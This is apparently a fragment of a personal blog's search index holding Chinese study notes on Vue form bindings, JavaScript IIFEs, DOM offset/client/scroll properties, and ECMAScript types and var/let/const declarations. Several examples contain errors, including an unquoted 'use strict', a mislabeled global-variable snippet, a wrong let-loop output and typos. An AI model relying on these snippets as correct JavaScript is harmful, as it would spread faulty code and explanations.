value=&quot;葡萄&quot;&gt;葡萄&lt;/option&gt; &lt;/select&gt; &lt;h2&gt;您选择的水果是：&#123;&#123;fruit&#125;&#125;&lt;/h2&gt; &lt;!-- 2.选择多个 --&gt; &lt;select name=&quot;abc&quot; v-model=&quot;fruits&quot; multiple&gt; &lt;option value=&quot;苹果&quot;&gt;苹果&lt;/option&gt; &lt;option value=&quot;香蕉&quot;&gt;香蕉&lt;/option&gt; &lt;option value=&quot;榴莲&quot;&gt;榴莲&lt;/option&gt; &lt;option value=&quot;葡萄&quot;&gt;葡萄&lt;/option&gt; &lt;/select&gt; &lt;h2&gt;您选择的水果是：&#123;&#123;fruit&#125;&#125;&lt;/h2&gt;&lt;/div&gt;&lt;script&gt; let app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, friut:&quot;香蕉&quot;, //所以香蕉会默认选上 fruits:[] &#125; &#125;)&#125;&lt;/script&gt; 9.5 值绑定 与v-bind相似 123&lt;label v-for=&quot;item in originHobbies&quot; :for=&quot;item&quot;&gt; &lt;input type=&quot;checkbox&quot; :value:&quot;item&quot; :id=&quot;item&quot; v-model=&quot;hobbies&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/label&gt; 9.6 修饰符 .lazy修饰符 默认情况下，v-model默认是在input事件中同步输入框的数据的 即一旦有数据改变 data中的数据就会自动发生改变 lazy修饰符可以让数据在失去焦点或回车时才会更新 .number修饰符 默认情况下，在输入框中输入的内容，都会被当作字符串类型进行处理 如果希望处理的是数字类型 type=”number“的，那么最好直接将内容当作数字处理 number修饰符可以让输入框中输入的内容自动转换成数字类型 .trim修饰符 如果输入的内容首尾有很多空格，通常希望将其去除 trim修饰符可以过滤内容左右两边的空格 12345678&lt;!-- lazy --&gt;&lt;input type=&quot;text&quot; v-model.lazy=&quot;message&quot;&gt;&lt;!-- number --&gt;&lt;input type=&quot;number&quot; v-model.number=&quot;age&quot;&gt;&lt;!-- trim --&gt;&lt;input type=&quot;text&quot; v-model.trim=&quot;name&quot;&gt;","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"立即执行函数","slug":"js/立即执行函数","date":"2021-03-05T16:00:00.000Z","updated":"2021-03-05T16:00:00.000Z","comments":false,"path":"learningNotes/js/立即执行函数","link":"learningNotes/js/立即执行函数","permalink":"https://shylees.github.io/learningNotes/js/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0","excerpt":"","text":"1234567891011121314151617181920212223242526272829//普通函数 写完函数 + 调用function fn()&#123; console.log(1);&#125;fn();//1.立即执行函数：不需要调用 马上执行//2.写法：// (function()&#123;&#125;)() / (function()&#123;&#125;());//第二个小括号 相当于 调用的作用(function()&#123; console.log(1)&#125;)(); //if有多个立即执行函数 要用分号隔开//第二个小括号 也可以传参(function(a)&#123; console.log(a);&#125;)(1)//也可以非匿名函数(function sum(a, b)&#123; console.log(a + b);&#125;)(1 , 2)//第二个写法与第一个相同//3.最大的作用是 独立创建了一个作用域 避免了命名冲突问题","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js webAPI--offset、client、scroll","slug":"js/三大系列","date":"2021-03-05T16:00:00.000Z","updated":"2021-03-07T16:00:00.000Z","comments":false,"path":"learningNotes/js/三大系列","link":"learningNotes/js/三大系列","permalink":"https://shylees.github.io/learningNotes/js/%E4%B8%89%E5%A4%A7%E7%B3%BB%E5%88%97","excerpt":"","text":"1.元素偏移量offset系列 1.1 offset概述 offset就是偏移量的意思，使用offset系列相关属性可以动态的得到该元素的位置（偏移）、大小等。 获取元素距离带有定位的父元素的位置 获得元素自身的大小 返回的数值不带单位 offset 系列常用属性： offset系列常用属性 作用 element.offsetParent 返回作为该元素带有定位的父级元素 if都无 则返回body element.offsetTop 返回元素相对带有定位父元素上方的偏移 element.offsetLeft 返回元素相对带有定位父元素左边框的偏移 element.offsetWidth 返回自身包括padding、边框、内容区的宽度，不带单位 element.offsetHeight 返回自身包括padding、边框、内容区的高度，不带单位 123456789101112131415161718192021222324252627282930313233343536 &lt;style&gt; .father &#123; position: relative; width: 200px; height: 200px; margin: 150px; background-color: antiquewhite; &#125; .son &#123; width: 100px; height: 100px; margin: 20px; background-color: brown; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;father&quot;&gt; &lt;div class=&quot;son&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;script&gt; let father = document.querySelector(&#x27;.father&#x27;); let son = document.querySelector(&#x27;.son&#x27;); //1.可以得到元素的偏移量 console.log(father.offsetTop); //150 if加上padding 150 console.log(son.offsetLeft); //if.father 没有定位 : 170 if.father 加上定位 :20 if.father 加上padding 40 //2.可以得到元素的大小 console.log(father.offsetHeight); //240 包含padding+border+width //3.返回带有定位的父元素 or 返回body console.log(son.offsetParent); //返回最近一级有定位的父亲 console.log(son.parentNode); //返回亲父亲 &lt;/script&gt; 1.2 offset 与 style 区别 offset： offset 可以得到任意样式表中的样式值 offset 系列获得的数值是没有单位的 offsetWidth 包含padding + border + width offsetWidth 等属性是只读属性，只能获取不能赋值 所以，我们想要获取元素大小位置，用 offset 更合适 style： style 只能得到行内样式表中的样式值 style.width 获得的是带有单位的字符串 style.width 获得不包含 padding 和border 的值 style.width 是可读写属性，可以获取也可以赋值 所以，我们想要给元素更改值，则需要用style 12345678910111213141516&lt;style&gt; .box&#123; width:200px; height:200px; &#125;&lt;/style&gt;&lt;html&gt; &lt;div class=&#x27;box&#x27;&gt;&lt;/div&gt;&lt;/html&gt;&lt;script&gt; let box = document.querySelector(&#x27;.box&#x27;); console.log(box.offsetWidth); //200 console.log(box.style.width); //若无行内 则不输出 if .box加上 style=&#x27;width：200px&#x27; 200px //offsetwidth 赋值 对box/12行 输出 无影响 //.style.width 就会改值&lt;/script&gt; 1.3 案例之获取鼠标相对于盒子的位置 盒子在页面中的距离 box.offsetLeft box.offsetTop 鼠标在页面中的坐标 e.pageX e.pageY 123456789101112131415161718192021222324&lt;style&gt; * &#123; margin: 0; margin: 0; &#125; .box &#123; width: 200px; height: 200px; margin: 50px; background-color: brown; &#125;&lt;/style&gt;&lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;script&gt; let box = document.querySelector(&#x27;.box&#x27;); box.addEventListener(&#x27;click&#x27;, function(e) &#123; let x = e.pageX - box.offsetLeft; let y = e.pageY - box.offsetTop; console.log(x, y); &#125;)&lt;/script&gt; 1.4 案例之模态框的拖拽 原理：鼠标按下并且移动，松开鼠标 事件：鼠标按下mousedown 鼠标移动mousemove 鼠标松开mouseup 过程：鼠标移动过程中，获得最新的值赋值给模态框的left和top值 模态框的位置：鼠标的坐标减去鼠标在盒子内的坐标 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;style&gt; * &#123; padding: 0; margin: 0; &#125; div &#123; position: relative; top: 50%; left: 50%; transform: translate(-50%, 50%); width: 300px; height: 150px; background-color: plum; &#125; .hide &#123; position: absolute; top: 0px; right: 5px; &#125;&lt;/style&gt;&lt;p class=&quot;show&quot;&gt;点击弹出&lt;/p&gt;&lt;div class=&quot;model&quot;&gt; &lt;span class=&quot;hide&quot;&gt;x&lt;/span&gt;&lt;/div&gt;&lt;script&gt; let show = document.querySelector(&#x27;.show&#x27;); let model = document.querySelector(&#x27;.model&#x27;); let hide = document.querySelector(&#x27;.hide&#x27;); show.addEventListener(&#x27;click&#x27;, function() &#123; model.style.display = &#x27;block&#x27;; &#125;) model.addEventListener(&#x27;mousedown&#x27;, function(e) &#123; //1.鼠标按下，获得鼠标在盒子内的坐标 —— 不变的 let clickX = e.pageX - model.offsetLeft; let clickY = e.pageY - model.offsetTop; // console.log(clickX, clickY); //2.鼠标移动过程中，获得最新的值 变的长度-不变的长度 赋值给模态框的left和top值 document.addEventListener(&#x27;mousemove&#x27;, move); function move(ec) &#123; model.style.left = ec.pageX - clickX + &#x27;px&#x27;; model.style.top = ec.pageY - clickY + &#x27;px&#x27;; &#125; //3.鼠标弹起 移除鼠标移动事件 document.addEventListener(&#x27;mouseup&#x27;, function() &#123; document.removeEventListener(&#x27;mousemove&#x27;, move); &#125;) &#125;) hide.addEventListener(&#x27;click&#x27;, function() &#123; this.arentNode.style.display = &#x27;none&#x27;; &#125;)&lt;/script&gt; 2.元素可视区client系列 client就是客户端的意思，我们使用client系列的相关属性来获取元素可视区的相关信息。通过client系列的相关属性可以动态的得到该元素的边框大小、元素大小等。 client系列属性 作用 element.clientTop 返回元素上边框的大小 element.clientLeft 返回元素左边框的大小 element.clientWidth 返回自身包括padding、内容区的宽度、不包含边框，不带单位 element.clientHeight 返回自身包括padding、内容区的高度、不包含边框，不带单位 3.元素scroll系列 3.1元素scroll系列属性 scroll就是滚动的的意思，使用scroll系列相关属性可以动态得到该元素的大小、滚动距离等。 scroll系列属性 作用 element.scrollTop 返回被卷去的上侧距离，不带单位 element.scrollLeft 返回被卷去的左侧距离，不带单位 element.scrollWidth 返回自身实际宽度 不含边框，不带单位 element.scrollHeight 返回自身实际高度，不含边框，不带单位 element.scrollWidth ：if内容超过宽度 则比宽度大，包含padding，可以说是实际内容的大小 3.2 页面被卷去的头部 如果浏览器的高/宽度不足以显示整个页面时，会自动出现滚动条。当滚动条向下滚动时，页面上面被隐藏掉的高度，称为页面被卷去的头部。滚动条在滚动时会触发onscroll事件。 123div.addEventListener(&#x27;scroll&#x27;,function()&#123; console.log(div.scrollTop);&#125;) 3.3 案例之返回顶部 需要用到页面滚动事件scroll 因为是页面滚动，所以事件源是document 滚动到某个位置，就是判断页面被卷去的上部值 页面被卷去的头部：可以通过window.pageYOffset获得 (如果是页面被卷曲的左侧 window.pageXOfffset) 注意，元素被卷去的头部是element.scrollTop，如果是页面被卷去的头部则是window.pageYOffset 1234567891011121314151617181920212223242526272829303132333435363738394041 &lt;div class=&quot;slider-bar&quot;&gt; &lt;span class=&quot;goBack&quot;&gt;返回顶部&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;header w&quot;&gt;头部区域&lt;/div&gt; &lt;div class=&quot;banner w&quot;&gt;banner区域&lt;/div&gt; &lt;div class=&quot;main w&quot;&gt;主体部分&lt;/div&gt; &lt;script&gt; //1.获取元素 var sliderbar = document.querySelector(&#x27;.slider-bar&#x27;); var banner = document.querySelector(&#x27;.banner&#x27;); //但我们侧边栏固定定位之后应该变化的值 let tops = sliderbar.offsetTop - banner.offsetTop; //获取main 主体元素 var main = document.querySelector(&#x27;.main&#x27;); var goBack = document.querySelector(&#x27;.goBack&#x27;); //2.页面滚动事件 scroll document.addEventListener(&#x27;scroll&#x27;, function() &#123; //3.当页面被卷去的头部 大于等于banner区域 侧边栏改为固定定位 if (window.pageYOffset &gt;= banner.offsetTop) &#123; sliderbar.style.position = &#x27;fixed&#x27;; sliderbar.style.top = tops + &#x27;px&#x27;; //tops 得再外面定义 不然值会变的 &#125; else &#123; sliderbar.style.position = &#x27;absolute&#x27;; sliderbar.style.top = &#x27;300px&#x27;; &#125; //4.当页面滚动到main 盒子就显示goback模块 if (window.pageYOffset &gt;= main.offsetTop) &#123; goBack.style.display = &#x27;block&#x27;; &#125; else &#123; goBack.style.display = &#x27;none&#x27;; &#125; &#125;)&lt;/script&gt; 3.4 页面被卷去的头部兼容性解决方案 因此被卷去的头部通常有如下几种写法： 声明了DTD(&lt;!DOCTYPE html&gt;)，使用document.documentElement.scrollTop 未声明DTD，使用document.body.scrollTop 新方法window.pageYOffset 和 window.pageXOffset ，IE9开始支持 12345678function getScroll()&#123; return&#123; left:window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0; top:window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0; &#125;;&#125;//使用时 getScroll().left 三大系列总结 三大系列大小对比 作用 element.offsetWidth 返回自身+padding+边框，内容区的宽度 element.clientWidth 返回自身+padding，内容区的宽度 element.scrollWidth 返回自身实际宽度，+padding 主要用法： offset 系列：获取元素的位置 offsetLeft offsetTop client 系列：获取元素大小 clientWidth clientHeight scroll系列：获取滚动距离 scrollTop scrollLeft 页面的滚动距离通过 window.pageXOffset 获得","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"红宝书 - 3.4数据类型","slug":"3.4数据类型","date":"2021-02-08T16:00:00.000Z","updated":"2021-02-14T16:00:00.000Z","comments":false,"path":"readNotes/3.4数据类型","link":"readNotes/3","permalink":"https://shylees.github.io/readNotes/3.4%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B","excerpt":"","text":"ECMAScript有6种简单数据类型/原始类型、一种复杂数据类型； 简单数据类型：Undefined、Null、Boolean、Number、String、Symbol。（Symbol是es6新增的） 复杂数据类型：Object（对象） 3.4.1 typeof操作符 因为ECMAScript的类型系统是松散的，所以需要一种手段来确定任意变量的数据类型。对一个值使用typeof操作符会返回下列字符串之一： undefined 值未定义 boolean 值为布尔值 string 值为字符串 number 值为数据 object 值为对象/null（因为null被认为是一个对空对象的引用） function 值为函数 symbol 值为符号 123456let message = &quot;some string&quot;;console.log(typeof message); //&quot;string&quot;console.log(typeof (message)); //&quot;string&quot;console.log(typeof 95) //&quot;number&quot;//typeof是一个操作符而不是函数，所以不需要参数 但也可以使用参数 3.4.2 Undefined类型 1.Undefined类型只有一个值⇨undefined 未经初始化的变量，默认初始值为undefined。 所以给变量显示以undefined来初始化是不必要的 2.未初始化和未定义变量的区别： 123456789let message;console.log(message); //undefinedconsole.log(age); //报错//非严格模式下：对未声明的变量调用delete不会报错，但这个操作无用，严格模式下：会报错console.log(typeof message); //undefinedconsole.log(typeof age); //undefined//虽然这两个变量存在根本性差异，但他们都无法执行实际操作 建议在声明变量的同时进行初始化，这样当typeof返回undefined时，就知道是给定变量未声明。 3.用更简洁的方式检测undefined undefined是一个^假值，所以如果需要也可以用更简洁的方式检测。因为有好几个假值，所以一定要明确自己想检测的就是undefined这个字面值而不仅仅是假值。 1234let message;if(message)&#123;&#125; //不会执行if(!message)&#123;&#125; //会执行if(age)&#123;&#125; //会报错 3.4.3 Null类型 1.Null类型只有一个值⇨null 逻辑上讲，null表示一个空对象指针，这也是 “typeof null” 会返回 ”object” 的原因： 12let car = null;console.log(typeof car); //&quot;object&quot; 在定义将来要保存对象值的变量时，建议使用null来初始化，不使用其他值，这样只要检测这个变量的值是不是null就可以知道这个变量是否在后来被重新赋予了一个对象的引用 2.null == undefined undefined值是由null值派生的，所以ECMA-262将其定义为表面上相等： 12console.log(null == undefined); //trueconsole.log(null === undefined); //false 但用途是完全不一样的：永远不必显示地将变量值设为undefined，但只要变量保存对象，而当时又无对象可保存，就要用null来填充。这样就可以保持null是空对象指针的语义，并进一步与undefined区分开 3.用更简洁的的方式检测null null是一个^假值，所以如果需要也可以用更简洁的方式检测。因为有好几个假值，所以一定要明确自己想检测的就是null这个字面值而不仅仅是假值。 123456let message = null;let age;if(message)&#123;&#125; //不执行if(!message)&#123;&#125; //执行if(age)&#123;&#125; //不执行if(!age)&#123;&#125; //执行 3.4.4 Boolean类型 1.Boolean类型有两个字面值⇨true、false 这两个布尔值不同于数值，因此 true != 1，false != 0。 布尔值字面量 true 和 false 区分大小写，因此 True 和 False（及其他大小混写形式） 是有效的标识符 2.所有其他 ECMAScript 类型的值都有相应布尔值的等价形式 要将一个其 他类型的值转换为布尔值，可以调用特定的 Boolean()转型函数： 12let message = &quot;Hello world&quot;;let messageAsBoolean = Boolean(message); //true 3.不同类型与布尔值之间的转换规则 数据类型 转换为true 转换为false Boolean true false String 非空字符串 “”（空字符串） Number 非零数值（包括无穷值） 0、NaN Object 任意对象 null Undefined undefined 3.4.5 Number类型 Number 类型使用 IEEE 754 格式表示整 数和浮点值（在某些语言中也叫双精度值）。 1.不同的数值类型有不同的数值字面量格式 最基本的数值字面量格式是十进制整数， 直接写出来即可 1let intNum = 55; 也可以用八进制（以 8 为基数）字面量表示 第一个数字必须是零（0），然后是相应的八进制数字（数值 0~7））。如果字面量中包含的数字超出了应 有的范围，就会忽略前缀的零，后面的数字序列会被当成十进制数： 12345let octalNum1 = 070; // 八进制的 56let octalNum2 = 079; // 无效的八进制值，当成 79 处理let octalNum3 = 08; // 无效的八进制值，当成 8 处理//八进制字面量在严格模式下是无效的，会导致 JavaScript 引擎抛出语法错误 或十六进制（以 16 为基数）字面量表示 必须让真正的数值前缀 0x（区分大小写），然后是十六进制数字（0~9 以 及 A~F）。十六进制数字中的字母大小写均可。 12let hexNum1 = 0xA; // 十六进制 10let hexNum2 = 0x1f; // 十六进制 31 使用八进制和十六进制格式创建的数值在所有数学操作中都被视为十进制数值 2.浮点值 要定义浮点值，数值中必须包含小数点，而且小数点后面必须至少有一个数字。 虽然小数点前面不是必须有整数，但推荐加上 123let floatNum1 = 1.1;let floatNum2 = 0.1;let floatNum3 = .1; // 有效，但不推荐 因为存储浮点值使用的内存空间是存储整数值的两倍，所以 ECMAScript 总是想方设法把值转换为 整数。在小数点后面没有数字或者是.0的情况下，数值就会变成整数。 12let floatNum1 = 1.; // 小数点后面没有数字，当成整数 1 处理let floatNum2 = 10.0; // 小数点后面是零，当成整数 10 处理 3.科学计数法 ECMAScript 中科学记数法的格式要求是一个数值（整数或浮点数）后跟一个大 写或小写的字母 e，再加上一个要乘的 10 的多少次幂。比如： 12let floatNum = 3.125e7; // 等于 31250000 let folatNum = 3e-17; // 等于 0.000 000 000 000 000 03 浮点值的精确度最高可达 17 位小数，但在算术计算中远不如整数精确。 例如，0.1 加 0.2 得到的不 是 0.3，而是 0.300 000 000 000 000 04。由于这种微小的舍入错误，导致很难测试特定的浮点值。 1234if (a + b == 0.3) &#123; // 别这么干！ console.log(&quot;You got 0.3.&quot;);&#125; //这里检测两个数值之和是否等于 0.3。如果两个数值分别是 0.05 和 0.25，或者 0.15 和 0.15，那没问题。但如果是 0.1 和 0.2，如前所述，测试将失败。 4.值的范围 由于内存的限制，ECMAScript 可表示的 最小数值保存在 Number.MIN_VALUE 中， 5e-324； 最大数值保存在 Number.MAX_VALUE 中，1.797 693 134 862 315 7e+308。 如果数值超出了 JavaScript 可表示的范围，那么这个数值会被自动转换为一个特殊的 Infinity（无 穷）值。任何无法表示的负数以-Infinity（负无穷大）表示，任何无法表示的正数以 Infinity（正 无穷大）表示。如果计算返回正 Infinity 或负 Infinity，则该值将不能再进一步用于任何计算。 使用 Number.NEGATIVE_INFINITY 和 Number.POSITIVE_INFINITY 也可以获 取正、负 Infinity。没错，这两个属性包含的值分别就是-Infinity 和 Infinity。 5.NaN 有一个特殊的数值叫 NaN，意思是“不是数值”（Not a Number），用于表示本来要返回数值的操作 失败了（而不是抛出错误）。 0 / 非0 ： 报错 0 / 0 ：NaN 非0 / 0 ：Infinity / - Infinity NaN有几个独特的特性： 任何涉及 NaN 的操作始终返回 NaN（如 NaN/10） NaN 不等于包括 NaN 在内的任何值 1console.log(NaN == NaN); // false ECMAScript 提供了 isNaN()函数。该函数接收一个参数，可以是任意数据类型，判断参数是否“不是数值”。把一个值传给 isNaN()后，该函数会尝试把它转换为数值。某些非数值的 值可以直接转换成数值，如字符串&quot;10&quot;或布尔值。 12345console.log(isNaN(NaN)); // trueconsole.log(isNaN(10)); // false，10 是数值console.log(isNaN(&quot;10&quot;)); // false，可以转换为数值 10console.log(isNaN(&quot;blue&quot;)); // true，不可以转换为数值console.log(isNaN(true)); // false，可以转换为数值 1 6.数值转换 有 3 个函数可以将非数值转换为数值：Number()、parseInt()和 parseFloat() Number()是转型函数，可用于任何数据类型。后两个函数主要用于将字符串转换为数值。 Number()函数基于如下规则执行转换： 布尔值，true ⇨ 1，false ⇨ 0 数值，直接返回 null ⇨ 0 undefined ⇨ NaN 字符串，应用以下规则： 如果包含数值字符，包括数值字符前面带加、减号的情况，⇨ 一个十进制数值 如果包含有效的浮点值格式如&quot;1.1&quot;，⇨ 相应的浮点值 如果包含有效的十六进制格式如&quot;0xf&quot;，⇨ 与该十六进制值对应的十进制整数值 如果是空字符串（不包含字符）⇨ 0 如果包含除上述情况之外的其他字符，则返回 NaN 对象，调用 valueOf()方法，并按照上述规则转换返回的值。如果转换结果是 NaN，则调用 toString()方法，再按照转换字符串的规则转换。","categories":[{"name":"readNotes","slug":"readNotes","permalink":"https://shylees.github.io/categories/readNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"红宝书 - 第 3 章 语言基础","slug":"3.语言基础","date":"2021-01-28T16:00:00.000Z","updated":"2021-01-29T16:00:00.000Z","comments":false,"path":"readNotes/3.语言基础","link":"readNotes/3","permalink":"https://shylees.github.io/readNotes/3.%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80","excerpt":"","text":"任何语言的核心所描述的都是真语言再最基本的层面上如何工作，涉及语法、操作符、数据类型以及内置功能、再此基础上才可以构建复杂的解决方案。ECMA-262以一个名为ECMAScript的伪语言的形式，定义了JavaScript的所有这些方面。 本章的内容主要基于ECMAScript第6版。 3.1 语法 3.1.1 区分大小写 ECMAScript中一切都区分大小写。无论是变量、函数名、操作符，都区分大小写。 3.1.2 标识符 标识符：变量、函数、属性、函数参数的名称。 命名规则： 第一个字符必须是字母/下划线_/美元符号$ 剩下的字符可以是字母/下划线/美元符号/数字 关键字、保留字、true、false、null不能作为标识符 标识符中的字母可以是扩展ASCII中的字母，也可以是Unicode的字母字符。 按照惯例，ECMAScript标识符使用驼峰大小写形式。 虽然不是强制性，但因为这种形式跟ECMAScript内置函数和对象的命名方式一致，所以是最佳实现 3.1.3 注释 // 单行注释 /* 多行注释 */ 3.1.4 严格模式 ECMAScript 5 增加了严格模式的概念。其是一种不同的JavaScript解析和执行模型，ECMAScript 3 的一些不规范写法在这种模式下会被处理，对于不安全的活动将抛出错误。 要对整个脚本启用严格模式，在脚本开头加上：use strict; 看起来像没有赋值给任何变量的字符串，但它其实是一个预处理指令。任何支持的JavaScript引擎看到它都会切换严格模式。选择这种语法形式的目的是不破坏ECMAScript 3语法。 也可以单独指定一个函数在严格模式下执行，只要把这个预处理指令放到函数体开头就可以： 123function do()&#123; use strict;&#125; 严格模式会影响JavaScript执行的很多方面；所有现代浏览器都支持严格模式 3.1.5 语句 ECMAScript语句以分号结尾，虽然不是必需的，但推荐加上。 加分号便于开发者通过删除空行来压缩代码（如果没有分号，只删除空行，则会导致语法错误） 也有助于在某些情况提升性能，因为解析器会尝试在合适的位置补上分号以纠正语法错误 多条语句可以合并到代码块中&#123;&#125;。 if之类的控制语句只在执行多条语句时必须有代码块。 3.2 关键字与保留字 ECMA-262描述了一组保留的关键字，这些关键字有特殊用途，比如表示控制语句的开始和结束… 按照规定，保留的关键字不能用作标识符或属性名。 ECMA-262 第6版规定的所有关键字如下： break do in typeof case else instanceof var catch export new void class extends return while const finally super with continue for switch yield debugger function this default if throw delete import try 规范中也描述了一组未来的保留字，同样不能用作标识符或属性名。以下是ECMA-262 第6版 为将来保留的所有词汇 始终保留 enum 严格模式下保留implement package public interface protected static let private 模块代码中保留 await 这些词汇不能用作标识符，但还能用作对象的属性名。一般来说，不推荐使用。 3.3 变量 ECMAScript变量是松散类型的，即变量可以用于保存任何类型的数据。每个变量只不过是一个用于保存任意值的命名占位符。 有3个关键字可以声明变量： var ：在ECMAScript的所有版本中都可以使用 const ：ECMAScript 6 及更晚的版本中使用 let ：ECMAScript 6 及更晚的版本中使用 3.3.1 var关键字 要定义变量，可以使用var操作符，后面跟变量名： var message ECMAScript实现变量初始化，因此可以同时定义变量并设置它的值：var message = &quot;hi&quot;; 像这样初始化变量不会将它表示为字符串类型，只是简单的赋值而已； 随后不仅可以改变保存的值，也可以改变值的类型 12var message = &quot;hi&quot;;message = 100; //合法，但不推荐 var声明作用域 使用var操作符定义的变量会成为包含它的函数的局部变量。 比如，使用var在一个函数内部定义一个变量，就意味着该变量将在函数退出时被销毁： 12345function test()&#123; var message = &quot;hi&quot;; //局部变量&#125;test();console.log(message); //出错 在函数内定义变量时省略var操作符，可以创建一个全局变量 12345function test()&#123; var message = &quot;hi&quot;; //全局变量&#125;test();console.log(message); // “hi” 不推荐这么做，在局部作用域中定义的全局变量很难维护。 也会造成困扰，因为不能瞬间断定省略var是不是有意为之。 在严格模式下，如果像这样给未声明的变量赋值，会导致抛出ReferenceError。 如果定义多个变量，可以在一条语句中用逗号分隔每个变量： 1234var message = &quot;hi&quot;, found = false, age = 29;//因为ECMAScript时松散类型的，所以可以使用不同数据类型初始化的变量可以用一条语句来声明 在严格模式下，不能定义eval和arguments的变量，否则会导致语法错误 var声明提升 使用var声明的变量会自动提升到函数作用域顶部 12345function foo()&#123; console.log(age); var age = 26;&#125;foo(); //undefined 上述代码等同于 123456function foo()&#123; var age; //所谓的“提升” console.log(age); age = 26;&#125;foo(); //undefined 3.3.2 let声明 let声明的范围的块作用域，而var声明的范围是函数作用域 块作用域是函数作用域的子集 12345678910111213//varif(true)&#123; var name= &#x27;Matt&#x27;; console.log(name); //Matt&#125;console.log(name); //Matt//letif(true)&#123; let age = 26; console.log(age); //26&#125;console.log(age); //ReferenceError:age没有定义 let不允许同一个块作用域出现冗余声明 12345var name;var name;let age;let age; //SyntaxError; 标识符age 已经声明JavaScript引擎会记录用于变量声明的标识符及其所在的块作用域 嵌套使用相同的标识符不会报错，因为同一个块中没有重复声明 暂时性死区： let声明的变量不会在作用域中被提升 1234567//name会被提升console.log(name); //undefinedvar name = &#x27;Matt&#x27;;//age不会被提升console.log(age); //ReferenceError:age没有定义let age = 26; 在解析代码时，JavaScript引擎也会注意出现在块后面的let声明，只不过在此之前不能以任何方式来引用未声明的变量。在let声明之前的执行瞬间被称为“暂时性死区”，在此阶段引用任何后面才声明的变量都会抛出ReferenceError 全局声明： 与var不同，使用let在全局作用域中声明的变量不会成为window对象的属性 12345var name = &#x27;Matt&#x27;;console.log(window.name); //&#x27;Matt&#x27;let age = 26;console.log(window.age); //undefined 不过let声明仍然是在全局作用域中发生的，相应变量会在页面的生命周期内存续。因此，为了避免SyntaxError，必须确保页面不会重复声明同一个变量 条件声明： 在使用var声明变量时，由于声明会被提升，JavaScript引擎会自动将多余的声明在作用域顶部合并为一个声明。 let的作用域是块，所以不可能检查前面是否已经使用let声明过同名变量，也就不可能在没有声明的情况声明它。 1234567891011&lt;script&gt; var name = &#x27;Maiy&#x27;; let age = 26;&lt;/script&gt;&lt;script&gt; //假设脚本不确定页面是否已经声明了同名变量 那可以假设还没声明过 var name = &#x27;Matt&#x27;; //没有错误，因为可以被作为一个提升声明来处理 不需要检查之前是否声明过同名变量 let age = 36; //如果之前声明过，这里会报错&lt;/script&gt; 使用try/catch语句或typeof操作符也不能解决，因为条件块中let声明的作用域仅限于该块。 12345678910111213141516171819202122&lt;script&gt; let name = &#x27;Maiy&#x27;; let age = 26;&lt;/script&gt;&lt;script&gt; //假设脚本不确定页面是否已经声明了同名变量 那可以假设还没声明过 if(typeof name === &#x27;undefined&#x27;)&#123; let name; //name 被限制在if块作用域内 这个赋值形同全局赋值 &#125; name = &#x27;Matt&#x27;; try&#123; console.log(age); //若无声明过则会报错 &#125; catch(error)&#123; let age; //age被限制在catch块的作用域内 这个赋值形同全局赋值 &#125; age = 26;&lt;/script&gt; 对于let不能依赖条件声明模式 for循环中的let声明： 在let出现之前，for循环定义的迭代变量会渗透到循环体外部; 改使用let之后，就没有这个问题了，因为迭代变量的作用域仅限于for循环块内部； 123456789for(var i = 0 ; i &lt; 5 ; ++i)&#123; //循环逻辑&#125;console.log(i); // 5for(let i = 0 ; i &lt; 5 ; ++i)&#123; //循环逻辑&#125;console.log(i); //ReferenceError：i没有定义 在使用var时，最常见的问题就是对迭代遍历的奇特声明和修改： 123456789for(var i = 0 ; i &lt; 5 ; i++)&#123; setTimeout( () =&gt; console.log(i) , 0) //5 5 5 5 5&#125;//因为在退出循环时，迭代变量保存的是导致循环退出的值，所以在之后执行超时逻辑是，所有的i都是同一个变量，因而输出同一个值for(let i = 0 ; i &lt; 5 ; i ++)&#123; setTimeout( () =&gt; console.log(i) , 0) //1 2 3 4 5&#125;//使用let迭代变量时，JavaScript引擎在后台会为每个迭代循环声明一个新的迭代变量。每个setTimeout引用的都是不同的变量实例。 这种每次迭代声明一个独立变量实例的行为适用于所有风格for循环，包括for-in和for-of循环 3.3.3 const声明 const的行为于let基本相同，唯一一个重要的区别： 用const声明变量时，必须同时初始化变量，且尝试修改const声明的变量会导致运行错误。 12345678910111213const age = 26;age = 36; //TypeError：给常量赋值//const也不允许重复声明const name = &#x27;Matt&#x27;;const name = &#x27;Maiy&#x27;; //SyntaxError//const声明的作用域也是块const name = &#x27;MAtt&#x27;;if(true)&#123; const name = &#x27;Maiy&#x27;;&#125;console.log(name); //MAtt const声明的限制只适用于它指向的变量的引用。 即如果const变量引用的是一个对象，那么修改这个对象内部的属性并 不违反const的限制 12const person = &#123;&#125;;person.name = &#x27;Matt&#x27;; //没有语法错误 不能用const来声明迭代变量，因为迭代变量会自增 1for(const i = 0 ; i &lt; ; i ++)&#123;&#125; //TypeError:给常量赋值 若只想用const声明一个不会被修改的for循环变量，也是可以的。 即每次迭代只是创建一个新变量，这对for-of和for-in循环特别有意义 123456789101112let i = 0;for(const j = 7 ; i &lt; 5 ; i ++)&#123; console.log(j); // 7 7 7 7 7 &#125;for(const key in a: 1 , b: 2)&#123; console.log(key); //a b&#125;for(const value of [1,2,3,4,5])&#123; 